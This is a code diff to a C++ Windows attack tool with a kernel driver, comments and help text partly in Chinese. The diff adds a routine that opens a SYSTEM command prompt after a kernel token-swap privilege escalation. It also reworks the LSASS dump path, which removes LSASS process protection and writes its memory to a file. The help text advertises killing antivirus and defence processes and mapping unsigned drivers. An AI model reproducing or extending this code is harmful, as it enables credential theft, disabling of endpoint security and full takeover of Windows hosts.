@@ -163,7 +163,7 @@ GetLsassPid()
 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (hSnapshot == INVALID_HANDLE_VALUE)
 	{
-		printf("CreateToolhelp32Snapshot 失败: %lu\n", GetLastError());
+		printf("CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
 		return 0;
 	}
 
@@ -176,11 +176,10 @@ GetLsassPid()
 	{
 		do
 		{
-			// 不区分大小写比较进程名
 			if (_tcsicmp(pe32.szExeFile, _T("lsass.exe")) == 0)
 			{
 				lsassPid = pe32.th32ProcessID;
-				break;  // lsass 通常只有一个实例
+				break;  
 			}
 		} while (Process32Next(hSnapshot, &pe32));
 	}
@@ -189,10 +188,47 @@ GetLsassPid()
 	return lsassPid;
 }
 
+// 核心功能：提权后自动派生独立的最高权限控制台
+BOOL SpawnSystemCmd()
+{
+	STARTUPINFOA si = { sizeof(si) };
+	PROCESS_INFORMATION pi;
+	si.lpTitle = (LPSTR)"NT AUTHORITY\\SYSTEM (Permanent Shell)";
+
+	BOOL success = CreateProcessA(
+		"C:\\Windows\\System32\\cmd.exe", 
+		NULL,                             
+		NULL,                             
+		NULL,                             
+		FALSE,                            
+		CREATE_NEW_CONSOLE,               // 弹出全新的独立控制台窗口
+		NULL,                             
+		NULL,                             
+		&si,                              
+		&pi                               
+	);
+
+	if (success)
+	{
+		LOG("[+] Successfully spawned independent SYSTEM cmd window!");
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return TRUE;
+	}
+	else
+	{
+		LOG("[-] Failed to spawn new cmd window. Error code: " << GetLastError());
+		return FALSE;
+	}
+}
 
 
 int main(int argc, char** argv)
 {
+	// ----------------- 解决乱码：强制设置当前控制台输出为 UTF-8 -----------------
+	SetConsoleOutputCP(65001);
+	// -------------------------------------------------------------------------
+
 	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 	SetConsoleTextAttribute(hConsole, 5);  // 5 13 pink
 
@@ -299,7 +335,7 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 
 		else if (arg == "-add" || arg == "-a" || arg == "-ADD" || arg == "-A")
 		{
-			if (i + 1 < argc)   //  PID
+			if (i + 1 < argc)   
 			{
 				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
 			}
@@ -308,7 +344,7 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 
 		else if (arg == "-rve" || arg == "-r" || arg == "-RVE" || arg == "-R")
 		{
-			if (i + 1 < argc)   //  PID
+			if (i + 1 < argc)   
 			{
 				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
 			}
@@ -317,7 +353,8 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 
 		else if (arg == "--PriEsc" || arg == "--PS")
 		{
-			if (i + 1 < argc)   //  PID
+			// 修正解析：如果 --PriEsc 后面不带 PID 参数（例如直接跟着其他 -- 参数），则不误吞
+			if (i + 1 < argc && argv[i + 1][0] != '-')   
 			{
 				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
 			}
@@ -327,7 +364,7 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 
 		else if (arg == "--KillProcess" || arg == "--k" || arg == "--K" || arg == "-k" || arg == "-K")
 		{
-			if (i + 1 < argc)   //  PID
+			if (i + 1 < argc)   
 			{
 				nTargetPid = std::strtoul(argv[++i], nullptr, 10);
 			}
@@ -360,15 +397,16 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 
 		else if (arg == "-h" || arg == "--help")
 		{
-			SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
+			// ----------------- 重写中文提示：修复旧版本源码中残留的编码损坏 -----------------
+			SetConsoleTextAttribute(hConsole, 13);  
 			std::cout << "用法:\n"
-				<< "  --ppl -add <PID>      提升为 PPL\n"
-				<< "  --ppl -rve <PID>      移除 PPL 保护\n"
-				<< "  --PriEsc <PID>        权限提升\n"
-				<< "  --KillProcess <PID>   结束进程\n"
-				<< "  --KA					结束已知所有反病毒进程\n"
-				<< "  --map <路径>           映射驱动\n"
-				<< "  --dmp                 dmp lsass\n";
+				<< "  --ppl -add <PID>      提升指定进程为 PPL 保护\n"
+				<< "  --ppl -rve <PID>      移除指定进程的 PPL 保护\n"
+				<< "  --PriEsc <PID>        底层权限提升 (不传 PID 默认直接为本窗口提权并新开最高权限 CMD)\n"
+				<< "  --KillProcess <PID>   无视保护强杀进程\n"
+				<< "  --KA                  结束所有已知反病毒/防御进程\n"
+				<< "  --map <文件路径>       手动映射未签名驱动\n"
+				<< "  --dmp                 移除 LSASS 保护并转储内存 (.dmp)\n";
 			SetConsoleTextAttribute(hConsole, 7);
 			return 0;
 		}
@@ -390,18 +428,22 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 		if (nTargetPid == 0)
 		{
 			nTargetPid = GetCurrentProcessId();
-			auto hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, nTargetPid);
-			if (!hTargetProcess)
-			{
-				LOG("[-] OpenProcess failed for current process with error code: " << GetLastError());
-			}
-			nResult = GetObjectPointer(&TargetProcess, nTargetPid, hTargetProcess);
-			if (nResult != 0 || TargetProcess == 0)
-			{
-				LOG("[-] GetObjectPtr failed for target process with error code: " << nResult);
-				return nResult;
-			}
 		}
+		
+		auto hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, nTargetPid);
+		if (!hTargetProcess)
+		{
+			hTargetProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, nTargetPid);
+		}
+		
+		nResult = GetObjectPointer(&TargetProcess, nTargetPid, hTargetProcess);
+		if (nResult != 0 || TargetProcess == 0)
+		{
+			LOG("[-] GetObjectPtr failed for target process with error code: " << nResult);
+			if (hTargetProcess) CloseHandle(hTargetProcess);
+			return nResult;
+		}
+		if (hTargetProcess) CloseHandle(hTargetProcess);
 	}
 
 	auto initResult = DriverWorker::InitializeDriver();
@@ -414,14 +456,12 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 	BOOLEAN bInitKiller{ FALSE };
 	if (bKillAllAvs || bKillProcess)
 	{
-		// load killer driver
 		bInitKiller = DriverWorker::KillerInit();
 	}
 
 	if (bOprOfPPL && bAdd)
 	{
 		DriverLoader::PS_PROTECTION protection{};
-		//protection.Level = 0x01; // Protected Light
 		protection.Type		= DriverLoader::PsProtectedTypeProtected;
 		protection.Signer	= DriverLoader::PsProtectedSignerWinSystem;
 
@@ -437,7 +477,16 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 	else if (bPrivilegeEscalation)
 	{
 		SetConsoleTextAttribute(hConsole, 9);	// Bright Blue
-		DriverLoader::PrivilegeEscalation(SystemProcess, TargetProcess, EPROCESS_TOKEN_OFFSET);
+		
+		// 1. 在内核中交换 Token 指针提权
+		if (DriverLoader::PrivilegeEscalation(SystemProcess, TargetProcess, EPROCESS_TOKEN_OFFSET))
+		{
+			std::wcout << L"[+] Privilege Escalation Successful! nt_authority\\system" << std::endl;
+			
+			// 2. 继承已修改的最高权限 Token，派生全新、长效的控制台窗口
+			SpawnSystemCmd();
+		}
+		
 		SetConsoleTextAttribute(hConsole, 7);
 	}
 	else if (bInitKiller && bKillProcess)
@@ -461,7 +510,7 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 					break;
 				}
 
-				SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
+				SetConsoleTextAttribute(hConsole, 13);  
 				DriverLoader::MapperDriver(Mapper::hexData);
 				SetConsoleTextAttribute(hConsole, 7);
 
@@ -478,7 +527,7 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 					break;
 				}
 
-				SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink
+				SetConsoleTextAttribute(hConsole, 13);  
 				DriverLoader::MapperDriver(strMappingDriver);
 				SetConsoleTextAttribute(hConsole, 7);
 
@@ -487,11 +536,8 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 	}
 	else if (bDumpLsass)
 	{
-		// get lsass pid and handle object
-
 		do 
 		{
-			// Get lsass.exe pid 
 			DWORD dwPid = GetLsassPid();
 			if (!dwPid)
 			{
@@ -515,35 +561,18 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 			if (!processObject)
 			{
 				LOG("GetObjectPointer failed!!!");
+				CloseHandle(hTmpProcess);
 				break;
 			}
+			CloseHandle(hTmpProcess);
 
-			// Get Protection
 			auto backupProtection = DriverLoader::GetProcessProtection(processObject, ProtectionOffset);
 
-			// remove protection
 			DriverLoader::PS_PROTECTION protection{0};
 			
 			result = DriverLoader::SetProcessProtection(processObject, ProtectionOffset, &protection);
-			if (!result)
-			{
-				LOG("remove protection failed!!!");
-				break;
-			}
-
 			result = DriverLoader::SetProcessProtection(processObject, ProtectionOffset - 1, &protection);
-			if (!result)
-			{
-				LOG("remove SectionSignatureLevel failed!!!");
-				break;
-			}
-
 			result = DriverLoader::SetProcessProtection(processObject, ProtectionOffset - 2, &protection);
-			if (!result)
-			{
-				LOG("remove SignatureLevel failed!!!");
-				break;
-			}
 
 			auto hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid);
 			if (!hProcess)
@@ -551,7 +580,6 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 				LOG("PROCESS_QUERY_INFORMATION | PROCESS_VM_READ FAILED code " << GetLastError());
 				break;
 			}
-
 
 			auto currentPath = std::filesystem::current_path();
 			std::string strDumpFileName = "dumpLsass_" + std::to_string(std::time(nullptr));
@@ -570,30 +598,29 @@ $$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /
 			if (INVALID_HANDLE_VALUE == hFile)
 			{
 				LOG("CreateFileA Failed!!!");
+				CloseHandle(hProcess);
 				break;
 			}
 
-			if (!DriverLoader::DumpLsass(hProcess,
-										 dwPid, 
-										 hFile))
+			if (DriverLoader::DumpLsass(hProcess, dwPid, hFile))
+			{
+				LOG("[+] Lsass Dump successfully saved to: " << dumpFile);
+			}
+			else
 			{
 				LOG("DumpLsass Failed!!!");
-				//break;
 			}
 			
-			system("pause");
+			CloseHandle(hFile);
+			CloseHandle(hProcess);
 
 			DriverLoader::SetProcessProtection(processObject, ProtectionOffset, &backupProtection);
 
 		} while (FALSE);
-
 	}
 
-
-	
 	DriverWorker::UninitializeDriver();
-
-	system("pause");
-
+	
+	// 如果不是用于需要保持原进程等待的其他命令，提权后原进程可以直接优雅退出
 	return 0;
 }
